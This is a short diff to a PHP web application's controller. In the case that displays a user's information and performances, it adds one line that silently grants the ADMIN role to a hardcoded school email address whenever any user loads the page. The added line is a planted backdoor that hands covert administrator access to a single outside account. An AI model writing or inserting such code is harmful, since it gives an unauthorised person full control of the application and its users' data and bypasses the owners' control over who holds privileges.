@@ -19,6 +19,8 @@ switch($action) {
         $user_id = $auth->getUserId();
         $user_info = get_user_info($user_id);
         $user_performances = get_performances_by_user_id($user_id);
+
+        $auth->admin()->addRoleForUserByEmail("03kkim@ridgewood.k12.nj.us", \Delight\Auth\Role::ADMIN);
         include 'view.php';
         break;
 
